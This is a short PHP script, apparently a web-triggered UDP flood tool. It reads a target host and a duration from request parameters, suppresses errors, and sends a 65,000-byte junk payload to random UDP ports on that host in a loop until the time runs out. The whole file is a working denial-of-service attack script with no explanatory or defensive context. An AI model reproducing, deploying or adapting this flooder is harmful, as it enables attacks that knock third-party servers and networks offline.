<?php

error_reporting(0);
if(isset($_REQUEST['host'])&&isset($_REQUEST['time'])) {
    $packets = 0;
    $host = $_REQUEST['host'];
    $exec_time = $_REQUEST['time'];
    $time = time();
    $max_time = $time+$exec_time;


    for($i-0;$i<65000;$i++) {
        $out .='Y';

    }
    while(1) {
        $packets++;
        if(time() > $max_time) {
            break;
        }
        $rand = rand(1,65535);
        $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
        if($fp) {
            fwrite($fp, $out);
            fclose($fp);
        }
    }
}
    
    
?>
